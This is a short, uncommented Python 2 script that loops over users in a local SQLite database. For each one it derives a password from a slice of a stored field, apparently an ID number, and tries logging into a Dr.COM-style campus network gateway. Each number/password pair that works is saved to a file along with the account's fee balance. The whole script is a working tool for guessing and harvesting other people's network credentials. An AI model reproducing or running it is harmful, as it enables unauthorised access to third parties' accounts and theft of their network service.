import re
import urllib
import urllib2
import sqlite3
import datetime
url_in = "http://192.168.168.168"
url_out = "http://192.168.168.168/F.htm"

def login(nu,pa):
    number=nu
    password=pa
    values = {'DDDDD':number,'upass':password,'0MKKey':'%B5%C7%C2%BC+Login'}
    data = urllib.urlencode(values)
    req = urllib2.Request(url_in, data)
    response = urllib2.urlopen(req)
    the_page = response.read()
    if (the_page.find('Please don\'t forget to log out after you have finished'))>-1:
        return True
def logout():
    req=urllib2.Request(url_out)
    response = urllib2.urlopen(req)
    the_page = response.read()
    fee_pa=re.compile(r'(?<=fee=\')[\d]+')
    fee=fee_pa.search(the_page).group()
    time_pa=re.compile(r'(?<=time=\')[\d]+')
    return(fee)
f=open('./final.txt','aw')

def getlast():
    final=open('./final.txt','r')
    all_account=final.readlines()
    t=all_account[len(all_account)-1].split('\t')[0]
    final.close()
    return t

lock=1
cx=sqlite3.connect("./data.db")
cu=cx.cursor()
raws=(cu.execute('select * from User'))
for line  in raws :
    if line[2]:
        if int(line[2][5:7])>9:
            drcom_nu=line[2]
            drcom_pa=line[3][12:18]
            print(line[2])
            if drcom_nu==getlast():
                lock=0
                print('++++++++++++unlock++++++++++++')
            if lock==0:
                if(login(drcom_nu,drcom_pa)):
                    fee=logout()
                    print(fee)
                    f.write(drcom_nu+'\t'+drcom_pa+'\t'+fee+'\t'+str(datetime.date.today().year)+'-'+str(datetime.date.today().month)+'-'+str(datetime.date.today().day)+'\n') 
                    f.flush()
f.close()
print(cx.commit())
